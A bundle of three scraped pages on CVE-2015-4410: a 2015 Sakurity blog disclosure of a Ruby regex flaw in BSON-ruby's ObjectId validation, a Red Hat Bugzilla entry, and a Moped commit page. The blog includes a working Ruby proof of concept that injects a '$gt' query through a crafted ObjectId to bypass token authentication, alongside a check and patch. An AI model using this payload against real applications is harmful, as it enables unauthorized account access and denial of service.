=== Content from sakurity.com_0e344286_20250125_193514.html ===


* [Home](/)
* [Blog](/blog)
* [Research](/research)
* [Contact Us](/contact)

# Mongo BSON Injection: Ruby Regexps Strike Again

TL;DR There’s a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, **but most likely to critical BSON Injection** (similar to SQL injection) - depends on gem versions you use.

3 years ago [I wrote a blog post](https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html) about broken regular expressions in Ruby, `^$` meaning new lines `\n`. Back then I was only able to demonstrate XSS on Github and other websites using “javascript:a()\nhttps://”. I had a feeling there are much worse use cases of this vulnerability and here it is.

## Briefly About Gems

BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”.

Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.

Moped gem is A MongoDB driver for Ruby.

So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.

Most likely you’re using Mongoid or Mongo Mapper, but technically the vulnerability is in `legal?` of BSON::ObjectId.

## A Tale of One Regression

`legal?` was created in Moped::BSON on Jan 23, 2012. It intended to verify the \_id from user input is hexdecimal and is exactly 24 symbols. It looked like this:

```
def legal?(str)
  !!str.match(/^[0-9a-f]{24}$/i)
end
```

But this nasty `^$`-using Ruby code didn’t survive long - [on Apr 17, 2012 it was silently replaced](https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24) with proper `!!str.match(/\A\h{24}\Z/i)`

However, on March 31, 2013 Moped deleted internal BSON module and [switched to separate BSON gem](https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6)

![](/img/moped.png)

The `legal?` method successfully [migrated to mongodb/bson-ruby](https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191) before that (on March 3).

But on Apr 7 [an interesting commit happens](https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219). @durran (the maintainer of all those repos), replaces `/\A\h{24}\Z/ === string.to_s` with vulnerable `string.to_s =~ /^[0-9a-f]{24}$/i ? true : false`.

So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.

## Am I Vulnerable?

I see, you’re getting bored. Run this code to see if you’re vulnerable:

```
b=((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId)
raise "DoS!" if b.legal? "a"*24+"\n"
raise "Injection!" if b.legal? "a"*24+"\na"
```

And use this patch if you indeed are! Don’t forget to alert others.

```
def ((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId).legal?(s)
  /\A\h{24}\z/ === s.to_s
end
```
## The Vulnerability

If you’re lucky enough and use old version of Moped, only light version of DoS is possible.

Wait, did I mention another reason why Regexps in Ruby are horribly designed? There’s \A meaning the beginning and there’s \Z meaning the ending… or a new line. You’re supposed to know it. Because only \z means the ending. But most people don’t care the last `\n`.

![](/img/moped2.png)

So if you send something like `aaaaaaaaaaaaaaaaaaaaaaaa%0A` (with trailing `\n`), the `legal?` method will still return `true` because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with `[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')`.

Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.

But if you’re using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like \_id=`Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data`. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!

```
require 'uri'
b = BSON::Document.new
b["$query"] = {"token" => {"$gt"=>""}}

payload = b.to_bson[4..-2]
id_ish = ("\n\n" + "a"*24 + "\n\n")

fake_id = "a"*24 +
  "\x02_id\0".unpack('H*')[0] +
  [id_ish.size/2 + 1].pack('V').unpack('H*')[0] + id_ish + "00" +
  payload.unpack('H*')[0]

puts URI.encode(fake_id) # looks like:
# aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000

User.find fake_id #returns <User _id: 556f840f686f6d6746000000, token: "a">
```

Thanks to [@judofyr](https://twitter.com/judofyr) for the help with this PoC!

ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it’s supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.

\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00
mng\_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a\_id**\x00
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x02\_id\x00\x0F\x00\x00\x00\xAA
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x00\x03$query\x00\e\x00\x00
\x00\x03token\x00\x0F\x00\x00\x00\x02$gt\x00\x01**\x00\x00\x00\x00\x00\x00\x00

Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.

### Jun 4, 2015 • Egor Homakov ([@homakov](https://twitter.com/homakov))

#### Sakurity

* [Home](/)
* [Blog](/blog)
* [Research](/research)
* [Contact Us](/contact)

Sakurity Ltd, a Hong Kong company established in 2012.



=== Content from bugzilla.redhat.com_54b805ec_20250125_193511.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1229757)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1229757)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1229757)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1229757

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1229757**](show_bug.cgi?id=1229757)
(CVE-2015-4410)
- [CVE-2015-4410](https://access.redhat.com/security/cve/CVE-2015-4410) rubygem-moped: Denial of Service with crafted ObjectId string

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2015-4410 rubygem-moped: Denial of Service with crafted ObjectId string

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-4410 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | low | | [Severity:](page.cgi?id=fields.html#bug_severity) | low | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1228705](show_bug.cgi?id=1228705) | | TreeView+ | [depends on](buglist.cgi?bug_id=1229757&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1229757&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2015-06-09 14:56 UTC by Vasyl Kaigorodov | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 05:13 UTC ([History](show_activity.cgi?id=1229757)) | | [CC List:](page.cgi?id=fields.html#cclist) | 14 users (show)  bleanhar ccoleman dmcphers jdetiber jialiu jkeck jliggitt joelsmith jokerman jrusnack kseifried lmeyer mmccomas tdawson | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2015-07-29 22:22:25 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1229757#c0)  Vasyl Kaigorodov    2015-06-09 14:56:07 UTC  ``` The following Denial of Service issue was discovered in Moped Ruby gem:  If a crafted value will be passed to Moped::BSON::ObjecId.legal? method, this will cause Moped to think MongoDB is down, and ping it 39 more times with intervals. In other words, Moped will keep a worker busy for 5 seconds and make x40 requests to MongoDB.  [CVE-2015-4410](https://access.redhat.com/security/cve/CVE-2015-4410) was assigned to it: <http://seclists.org/oss-sec/2015/q2/653> Additional details might be found here: <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html> The fix can be found here: <https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999>   ```  [Comment 1](show_bug.cgi?id=1229757#c1)  Kurt Seifried    2015-07-29 22:22:25 UTC  ``` Statement:  This issue affects the versions of rubygem-moped as shipped with Red Hat OpenShift Enterprise 2.x. Red Hat Product Security has rated this issue as having Low security impact on Red Hat OpenShift Enterprise 2. Additionally access to the component using rubygem-moped is restricted, only trusted users and systems can send messages, thus no trust boundary violation occurs and this issue can not easily be used to create an exploitable security vulnerability on Red Hat OpenShift Enterprise 2.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1229757&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from github.com_7fe7febc_20250125_193512.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongoid%2Fmoped%2Fcommit%2Fdd5a7c14b5d2e466f7875d079af71ad19774609b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongoid%2Fmoped%2Fcommit%2Fdd5a7c14b5d2e466f7875d079af71ad19774609b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mongoid%2Fmoped)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Jan 15, 2024. It is now read-only.

[mongoid](/mongoid)
/
**[moped](/mongoid/moped)**
Public archive

* [Notifications](/login?return_to=%2Fmongoid%2Fmoped) You must be signed in to change notification settings
* [Fork
  151](/login?return_to=%2Fmongoid%2Fmoped)
* [Star
   200](/login?return_to=%2Fmongoid%2Fmoped)

* [Code](/mongoid/moped)
* [Issues
  72](/mongoid/moped/issues)
* [Pull requests
  18](/mongoid/moped/pulls)
* [Actions](/mongoid/moped/actions)
* [Projects
  0](/mongoid/moped/projects)
* [Security](/mongoid/moped/security)
* [Insights](/mongoid/moped/pulse)

Additional navigation options

* [Code](/mongoid/moped)
* [Issues](/mongoid/moped/issues)
* [Pull requests](/mongoid/moped/pulls)
* [Actions](/mongoid/moped/actions)
* [Projects](/mongoid/moped/projects)
* [Security](/mongoid/moped/security)
* [Insights](/mongoid/moped/pulse)

## Commit

[Permalink](/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge Replica Set Refactor

[Browse files](/mongoid/moped/tree/dd5a7c14b5d2e466f7875d079af71ad19774609b)
Browse the repository at this point in the history

```
* Removes Server, and Socket; replaced with Node, and Connection.

  Replica sets are now much more robustly supported, including failover
  and discovery.

* Refactors specs.

  Internal APIs are now tested with integration specs through the public
  APIs.

* More documentation.
```

* Loading branch information

[![@bernerdschaefer](https://avatars.githubusercontent.com/u/193?s=40&v=4)](/bernerdschaefer)

[bernerdschaefer](/mongoid/moped/commits?author=bernerdschaefer "View all commits by bernerdschaefer")
committed
Apr 17, 2012

1 parent
[9084773](/mongoid/moped/commit/908477366b165670f97d3d835211b55d61cf153d)

commit dd5a7c1

 Show file tree

 Hide file tree

Showing
**42 changed files**
with
**2,057 additions**
and
**3,322 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .gitignore
  [.gitignore](#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947)
* README.md
  [README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5)
* lib

  + lib/moped.rb
    [moped.rb](#diff-3032bf346ac0fd40723d55049bb40879907c89a46d26c15f33cb499e0f63f6f3)
  + moped

    - bson

      * lib/moped/bson/object\_id.rb
        [object\_id.rb](#diff-9c68b3e8872ca0f129def2917b61f0eb165c65c923854e45a4f0b7d4751231f9)
    - lib/moped/cluster.rb
      [cluster.rb](#diff-3cc74da2811041dea5b3f1f8ef4583d3ae6f3b97dce815bb3047865b4c56490d)
    - lib/moped/collection.rb
      [collection.rb](#diff-a1226d05c3f94d82e9cb7d539469c8c207e6411d9141a219012e5f890b48be7c)
    - lib/moped/connection.rb
      [connection.rb](#diff-3005f22a24887cae90ddf457022ad2685c8de00da9339f18a27d3c75e3e98e2e)
    - lib/moped/cursor.rb
      [cursor.rb](#diff-af8872f1ccc58c8da90a9be3b5ca95ac953e70a5d391258e5e3bb966555f93e0)
    - lib/moped/database.rb
      [database.rb](#diff-cd69f783e7a9835e3a8bcaa5ec7b03a430353d78c95a1eebf4026090b0d9e887)
    - lib/moped/errors.rb
      [errors.rb](#diff-1aec46244d4ea147c32d4d8e8dda552e706b19d3c45e1ea1c134642967ae9b62)
    - lib/moped/node.rb
      [node.rb](#diff-79753b177763d15c4ef7a1581e846d7dcec211b21bfb4a028eba06b393b3353d)
    - protocol

      * lib/moped/protocol/command.rb
        [command.rb](#diff-6abca509cabeaf81b9f877b3952838cc5ee6066fa6e62be801eb7ee8ebae9be7)
    - lib/moped/query.rb
      [query.rb](#diff-b1c4c678e39517894f854fd354f3e343a9a954380276203984c0f72eaa51d9db)
    - lib/moped/server.rb
      [server.rb](#diff-4872c50c1823c0977e62a6d5ede1f4385e14f0b60220967d0f397f564d5ab586)
    - lib/moped/session.rb
      [session.rb](#diff-f1a175c955187c7b9b27f913d66e459b1c6b460e7239505232a0e62b8f6c345f)
    - session

      * lib/moped/session/context.rb
        [context.rb](#diff-f71a229bae9bf7af059d3d678021601e75503c3a4128c12cdffa8efb164f3e8a)
    - lib/moped/socket.rb
      [socket.rb](#diff-07a3523c5adc63fb578f682b5a4d1e763304e975d5c4f29fb726b65b37f50bdd)
    - lib/moped/threaded.rb
      [threaded.rb](#diff-07f49c7a43c0b16141cf4766aea136129cb70458f045822e16888c0ee5d30786)
* perf

  + perf/cases.rb
    [cases.rb](#diff-543896ba9c715a4f53da16ebea410c0b187a2180bd861d3d3eb58ed0557212d5)
* spec

  + integration/protocol

    - spec/integration/protocol/authentication\_spec.rb
      [authentication\_spec.rb](#diff-f97bcf4140ac0d89972a3929a403ccfa1be0d759f2244d3333b4dc85f69cabbc)
    - spec/integration/protocol/protocol\_spec.rb
      [protocol\_spec.rb](#diff-189e37b33d87507733653fb96373ebc6e4753a3a3b453d61be58f80dc6042245)
  + spec/integration\_spec.rb
    [integration\_spec.rb](#diff-800588e3890bf8789d164579d3f87b2a5a8ee384fbea341a0e2e84ab52e887aa)
  + moped

    - bson

      * spec/moped/bson/object\_id\_spec.rb
        [object\_id\_spec.rb](#diff-648d82852c2a0c9451778573d4362407a8ae762c6bbb62999ea8e88dc1e88539)
    - spec/moped/cluster\_spec.rb
      [cluster\_spec.rb](#diff-1f28b47d68949b1f59ce2f87a28d7031e2cdc0d6c054133518edd13850ce7e05)
    - spec/moped/collection\_spec.rb
      [collection\_spec.rb](#diff-f8d3920938b979050ae5f7d377772312d7f5363b7b0416b7bb338fd346c4571c)
    - spec/moped/cursor\_spec.rb
      [cursor\_spec.rb](#diff-b2d742a3fbc5b12ba0fd59375a573423735c01fd5a45b93d1630e6ee15b2f5f2)
    - spec/moped/database\_spec.rb
      [database\_spec.rb](#diff-ec4de165014421639540e6f0a104fe9b1df297b3286985f3e25c8cf6f2bafe5b)
    - spec/moped/errors\_spec.rb
      [errors\_spec.rb](#diff-2cc3fac09cacc28f69475b6f9fa8f80377e75f3a2993500b42cfeb890ae724c9)
    - spec/moped/indexes\_spec.rb
      [indexes\_spec.rb](#diff-257d326c448cc353ad10d6673527572a9c6ac33c453d6080925790c40e4ba312)
    - spec/moped/logging\_spec.rb
      [logging\_spec.rb](#diff-47f7bb59e60c7e6af9d0ccd2a5385b02c49924977cfe6d14e1c386f1978f780a)
    - spec/moped/node\_spec.rb
      [node\_spec.rb](#diff-ae4967813eaafa89ca7ea5bfb74263accfc27c676330c5c7efbbda6d4bd4b461)
    - spec/moped/query\_spec.rb
      [query\_spec.rb](#diff-a64c760aa69ec66911f12625ebde3f63783657330c804e97858422998c57f9df)
    - spec/moped/server\_spec.rb
      [server\_spec.rb](#diff-7b095e2710e56d87a74aed9a1c8211e5371db7663860d6f72392a05ab198b97c)
    - spec/moped/session\_spec.rb
      [session\_spec.rb](#diff-aae208d075e23bb36f76b79dc19d34233490a9fd193e08ad173002846e2d6973)
    - spec/moped/socket\_spec.rb
      [socket\_spec.rb](#diff-bdec5c2cdac24596b1f3537c4c7e6b4b2d98991f2a52408f75bee0c581b75e2e)
  + spec/moped\_spec.rb
    [moped\_spec.rb](#diff-63320a3fa909fb73e7558864760e282c118e718f8751854fa12385a1bf729915)
  + spec/replset\_spec.rb
    [replset\_spec.rb](#diff-db7ccadbb4a3289fcf878ff4452f61a87c512698d06128673013637fda24acc7)
  + spec/spec\_helper.rb
    [spec\_helper.rb](#diff-89eebfcbc0f14b6d989517837ca1e94fce4e2ce9a03233641cd936f2b8d2ed94)
  + support

    - spec/support/mock\_connection.rb
      [mock\_connection.rb](#diff-c81c27337f9321b22d9e04eb330cbf497244694e6aab2e515625ff48ecc2424a)
    - spec/support/mongohq.rb
      [mongohq.rb](#diff-916b8c23977ceedad3f9eed77123186abfd2cd381b9c4d6ad240b890e3768550)
    - spec/support/replica\_set\_simulator.rb
      [replica\_set\_simulator.rb](#diff-02843d466413d92a4c6a4cb4fc7043edcbb46f351cd486b6462217051b1280b5)
    - spec/support/stats.rb
      [stats.rb](#diff-56fddbdc6eafc110082fcd3cde6ea48c2ac38d4f7233d571337c63dfe051674b)

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[.gitignore](#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947 ".gitignore")

Show comments

[View file](/mongoid/moped/blob/dd5a7c14b5d2e466f7875d079af71ad19774609b/.gitignore)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,5 +2,6 @@ Gemfile.lock |
|  |  | doc |
|  |  | .yardoc |
|  |  | .rvmrc |
|  |  | .env |
|  |  | perf/results |
|  |  | tmp/ |

160 changes: 160 additions & 0 deletions

160
[README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5 "README.md")

Show comments

[View file](/mongoid/moped/blob/dd5a7c14b5d2e466f7875d079af71ad19774609b/README.md)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -15,6 +15,21 @@ session[:artists].find(name: "Syd Vicious"). |
|  |  | ) |
|  |  | ``` |
|  |  |  |
|  |  | ## Features |
|  |  |  |
|  |  | \* Automated replica set node discovery and failover. |
|  |  | \* No C or Java extensions |
|  |  | \* No external dependencies |
|  |  | \* Simple, stable, public API. |
|  |  |  |
|  |  | ### Unsupported Features |
|  |  |  |
|  |  | \* GridFS |
|  |  | \* Map/Reduce |
|  |  |  |
|  |  | These features are possible to implement, but outside the scope of Moped's |
|  |  | goals. Consider them perfect opportunities to write a companion gem! |
|  |  |  |
|  |  | # Project Breakdown |
|  |  |  |
|  |  | Moped is composed of three parts: an implementation of the [BSON |
| Expand Down  Expand Up | | @@ -43,6 +58,31 @@ id.generation\_time # => 2012-04-11 13:14:29 UTC |
|  |  | id == Moped::BSON::ObjectId.from\_string(id.to\_s) # => true |
|  |  | ``` |
|  |  |  |
|  |  | <table><tbody> |
|  |  |  |
|  |  | <tr><th>new</th> |
|  |  | <td>Creates a new object id.</td></tr> |
|  |  |  |
|  |  | <tr><th>from\_string</th> |
|  |  | <td>Creates a new object id from an object id string. |
|  |  | <br> |
|  |  | <code>Moped::BSON::ObjectId.from\_string("4f8d8c66e5a4e45396000009")</code> |
|  |  | </td></tr> |
|  |  |  |
|  |  | <tr><th>from\_time</th> |
|  |  | <td>Creates a new object id from a time. |
|  |  | <br> |
|  |  | <code>Moped::BSON::ObjectId.from\_time(Time.new)</code> |
|  |  | </td></tr> |
|  |  |  |
|  |  | <tr><th>legal?</th> |
|  |  | <td>Validates an object id string. |
|  |  | <br> |
|  |  | <code>Moped::BSON::ObjectId.legal?("4f8d8c66e5a4e45396000009")</code> |
|  |  | </td></tr> |
|  |  |  |
|  |  | </tbody></table> |
|  |  |  |
|  |  | ### Moped::BSON::Code |
|  |  |  |
|  |  | The `Code` class is used for working with javascript on the server. |
| Expand Down  Expand Up | | @@ -299,6 +339,126 @@ scope.one # nil |
|  |  |  |
|  |  | </tbody></table> |
|  |  |  |
|  |  | # Exceptions |
|  |  |  |
|  |  | Here's a list of the exceptions generated by Moped. |
|  |  |  |
|  |  | <table><tbody> |
|  |  |  |
|  |  | <tr><th>Moped::Errors::ConnectionFailure</th> |
|  |  | <td>Raised when a node cannot be reached or a connection is lost. |
|  |  | <br> |
|  |  | <strong>Note:</strong> this exception is only raised if Moped could not |
|  |  | reconnect, so you shouldn't attempt to rescue this.</td></tr> |
|  |  |  |
|  |  | <tr><th>Moped::Errors::OperationFailure</th> |
|  |  | <td>Raised when a command fails or is invalid, such as when an insert fails in |
|  |  | safe mode.</td></tr> |
|  |  |  |
|  |  | <tr><th>Moped::Errors::QueryFailure</th> |
|  |  | <td>Raised when an invalid query was sent to the database.</td></tr> |
|  |  |  |
|  |  | <tr><th>Moped::Errors::AuthenticationFailure</th> |
|  |  | <td>Raised when invalid credentials were passed to `session.login`.</td></tr> |
|  |  |  |
|  |  | <tr><th>Moped::Errors::SocketError</th> |
|  |  | <td>Not a real exception, but a module used to tag unhandled exceptions inside |
